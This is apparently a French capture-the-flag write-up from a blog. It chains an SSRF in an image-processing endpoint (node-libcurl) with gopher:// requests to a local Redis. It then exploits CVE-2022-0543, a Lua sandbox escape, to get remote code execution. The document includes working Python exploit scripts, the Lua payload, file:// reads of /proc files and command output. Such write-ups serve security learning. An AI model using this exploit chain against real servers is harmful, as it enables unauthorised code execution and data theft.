[{"content":"Résumé api/red/generate endpoint est vulnerable au attaque SSRF, la requête envoyé est traité par la bibliothèque node-libcurl. Elle peut être utilisé avec beaucoup de protocoles ce qui permet d’investiguer le processus courant :\nfile:///proc/self/cmdline file:///proc/self/pwd/index.js L\u0026rsquo;implementation de Redis permet l\u0026rsquo;utilisation du protocole gopher, la version retourné 5.0.7 vulnerable à la CVE-2022-0543.\nIntroduction Ce que j\u0026rsquo;ai appris SSRF de base avec cross-protocol scripting (gopher:// schema). Interaction Redis avec Lua sandbox escape. Première utilisation de l\u0026rsquo;outil Caido. Aperçu général Aucun code source n\u0026rsquo;est fourni avec ce défi, j\u0026rsquo;ai donc directement testé l\u0026rsquo;application web après m\u0026rsquo;être connecté. J\u0026rsquo;ai soumis un URL valide d\u0026rsquo;une image, ce qui a eu pour effet de rendre une image saturé de rouge.\nIl n\u0026rsquo;y avait pas grand-chose d\u0026rsquo;autre à faire avec l\u0026rsquo;application, c\u0026rsquo;était la seul interaction possible qu\u0026rsquo;un utilisateur pouvais faire.\nEnumeration Pour la première fois j\u0026rsquo;ai utilisé l\u0026rsquo;outil Caido, qui est une alternative prometteuse de Burp Suite. J\u0026rsquo;ai envoyé la requête dans mon onglet Replay pour commencer à testé mon endpoint.\nSSRF avec node-libcurl Pour tester si l\u0026rsquo;application était vulnerable à une Server-Side Request Forgery, J\u0026rsquo;ai tout d\u0026rsquo;abord envoyé un URL qui n\u0026rsquo;etait pas une image. Si l\u0026rsquo;application traite la demande correctement, elle aurait dû renvoyer un message d\u0026rsquo;erreur. Or, ce n\u0026rsquo;était pas tout à fait le cas\u0026hellip;\nJ\u0026rsquo;ai bien reçu un message d\u0026rsquo;erreur, mais en incluant le corps du lien envoyé.\nCe diagramme résume ce qui se passe pendant une attaque SSRF de base. L\u0026rsquo;entrée est toujours fiable et renvoyée. Si ce type d\u0026rsquo;entrée utilisateur est autorisé, la gestion des erreurs et la validation des entrées doivent être renforcées pour n\u0026rsquo;autoriser que certains domaines et renvoyer des messages d\u0026rsquo;erreur appropriés.\nPour en savoir un peu plus sur la façon dont la demande a été traitée du côté du serveur, je me suis servi de interactsh pour identifier la bibliothèque utilisée.\n1 2 3 4 GET / HTTP/1.1 Host: nblwybgjkdkdtwjedhnb54rribbndgeea.oast.fun Accept: */* User-Agent: node-libcurl/2.3.4 la bibliothèque utilisée est node-libcurl, qui supporte une large quantité de protocoles.\nlibcurl is a free and easy-to-use client-side URL transfer library, supporting DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, Telnet and TFTP. libcurl supports SSL certificates, HTTP POST, HTTP PUT, FTP uploading, HTTP form based upload, proxies, cookies, user+password authentication (Basic, Digest, NTLM, Negotiate, Kerberos), file transfer resume, http proxy tunneling and more!\nOfficial description of the node-libcurl library En prenant en compte cela, j\u0026rsquo;ai tenté de lire un fichier local en utilisant le schéma file://.\nRedis et gopher Pour en savoir plus sur l\u0026rsquo;application web en cours d\u0026rsquo;exécution, j\u0026rsquo;ai lu le fichier /proc/self/cmdline, qui contient la commande utilisée pour démarrer l\u0026rsquo;application.\nEnsuite, j\u0026rsquo;ai voulu lire le contenu du fichier index.js situé dans /proc/self/cwd/index.js.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 const express= require(\u0026#39;express\u0026#39;); const app= express(); const session= require(\u0026#39;express-session\u0026#39;); const RedisStore = require(\u0026#34;connect-redis\u0026#34;)(session) const path = require(\u0026#39;path\u0026#39;); const cookieParser = require(\u0026#39;cookie-parser\u0026#39;); const nunjucks = require(\u0026#39;nunjucks\u0026#39;); const routes = require(\u0026#39;./routes\u0026#39;); const Database = require(\u0026#39;./database\u0026#39;); const { createClient } = require(\u0026#34;redis\u0026#34;) const redisClient= createClient({ legacyMode: true }) const db = new Database(\u0026#39;/tmp/redisland.db\u0026#39;); app.use(express.json()); app.use(cookieParser()); redisClient.connect().catch(console.error) \u0026lt;SNIP\u0026gt; Redis ou REmote DIctionary Server est un service populaire de mise en cache de données en mémoire, Souvent utilisé comme base de données.\nDans cette application, Redis est utilisé comme stockage des sessions avec redisClient.connect(). En l\u0026rsquo;absence d\u0026rsquo;options, j\u0026rsquo;ai supposé qu\u0026rsquo;il était connecté à l\u0026rsquo;adresse locale localhost:6379.\nJe sais que Redis implémente gopher, qui était une alternative au World Wide Web dans la fin des années 90.\nEtant donné que node-libcurl supporte plusieurs protocoles pour la SSRF, et que gopher peut être utilisé pour communiquer avec le client Redis, j\u0026rsquo;ai effectué une attaque Cross-Protocol Scripting en utilisant le schéma gopher://.\nPour automatiser cette opération, j\u0026rsquo;ai écrit un script python:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from urllib.parse import quote import requests URL = \u0026#34;http://\u0026lt;TARGET:HOST\u0026gt;/api/red/generate\u0026#34; payload = quote(\u0026#34;\u0026#34;\u0026#34; INFO quit \u0026#34;\u0026#34;\u0026#34;) input = {\u0026#34;url\u0026#34;:f\u0026#34;gopher://localhost:6379/_{payload}\u0026#34;} headers = {\u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Cookie\u0026#34;: \u0026#34;connect.sid=\u0026lt;SESSION_COOKIE\u0026gt;\u0026#34;} request = requests.post(url=URL, json=input, headers=headers) print(str(request.json()).replace(\u0026#34;\\\\n\u0026#34;, \u0026#34;\\n\u0026#34;).replace(\u0026#34;\\\\r\u0026#34;, \u0026#34;\u0026#34;)) J\u0026rsquo;ai soumis cette charge utile pour obtenir plus d\u0026rsquo;informations sur l\u0026rsquo;instance Redis actuelle.\n1 2 3 4 5 6 7 8 9 # Server redis_version:5.0.7 redis_git_sha1:00000000 redis_git_dirty:0 redis_build_id:636cde3b5c7a3923 redis_mode:standalone os:Linux 6.1.0-10-amd64 x86_64 arch_bits:64 \u0026lt;SNIP\u0026gt; Une recherche de vulnérabilités dans cette version spécifique de Redis (5.0.7) m\u0026rsquo;a conduit à CVE-2022-0543, découvert par Reginaldo Silva.\nExploitation Why? Cette vulnérabilité ne provient pas directement de Redis. Sur certaines distributions, Lua est chargé dynamiquement, ce qui m\u0026rsquo;a permis de réaliser une Remote Code Execution sur l\u0026rsquo;hôte en échappant a la sandbox de Lua.\nThis vulnerability existed because the Lua library in Debian/Ubuntu is provided as a dynamic library. A package variable was automatically populated that in turn permitted access to arbitrary Lua functionality.\nVulhub GitHub: Redis Lua Sandbox Escape and Remote Code Execution (CVE-2022-0543) PoC 1 2 3 4 5 6 7 8 9 -- loading \u0026#34;luaopen_io\u0026#34; module from the library to execute a command local io_l = package.loadlib(\u0026#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\u0026#34;, \u0026#34;luaopen_io\u0026#34;); local io = io_l(); -- executing the command \u0026#39;id\u0026#39; local f = io.popen(\u0026#34;id\u0026#34;, \u0026#34;r\u0026#34;); -- reading and returning the output of the command local res = f:read(\u0026#34;*a\u0026#34;); f:close(); return res J\u0026rsquo;ai transmis cette charge utile a la command eval du client Redis.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from urllib.parse import quote import requests URL = \u0026#34;http://\u0026lt;TARGET:HOST\u0026gt;/api/red/generate\u0026#34; payload = quote(\u0026#34;\u0026#34;\u0026#34; eval \u0026#39;local io_l = package.loadlib(\u0026#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\u0026#34;, \u0026#34;luaopen_io\u0026#34;); local io = io_l(); local f = io.popen(\u0026#34;id\u0026#34;, \u0026#34;r\u0026#34;); local res = f:read(\u0026#34;*a\u0026#34;); f:close(); return res\u0026#39; 0 quit \u0026#34;\u0026#34;\u0026#34;) input = {\u0026#34;url\u0026#34;:f\u0026#34;gopher://\u0026lt;TARGET:HOST\u0026gt;:6379/_{payload}\u0026#34;} headers = {\u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Cookie\u0026#34;: \u0026#34;\u0026lt;SESSION_COOKIE\u0026gt;\u0026#34;} request = requests.post(url=URL, json=input, headers=headers) print(str(request.json()).replace(\u0026#34;\\\\n\u0026#34;, \u0026#34;\\n\u0026#34;).replace(\u0026#34;\\\\r\u0026#34;, \u0026#34;\u0026#34;)) J\u0026rsquo;ai réussi à obtenir la RCE sur l\u0026rsquo;hôte.\n1 2 3 4 5 6 $ python script.py {\u0026#39;message\u0026#39;: \u0026#39;Unknown error occured while fetching the image file: $48 uid=101(redis) gid=101(redis) groups=101(redis) +OK \u0026#39;} Le flag se trouvait à la racine du système en tant qu\u0026rsquo;exécutable.\n1 2 3 4 5 $ python script.py {\u0026#39;message\u0026#39;: \u0026#39;Unknown error occured while fetching the image file: $32 HTB{\u0026lt;REDACTED\u0026gt;} +OK \u0026#39;} References https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/ https://www.vaadata.com/blog/wp-content/uploads/2022/01/SSRF_vulnerabilite_cheat_sheet.pdf https://www.npmjs.com/package/node-libcurl https://docs.kernel.org/filesystems/proc.html https://redis.io https://fr.wikipedia.org/wiki/Gopher https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce ","date":"2024-06-06T00:00:00Z","image":"https://wiloti.github.io/p/red_island/cover_hu8248267821472344247.png","permalink":"https://wiloti.github.io/fr/p/red_island/","title":"Red Island"}]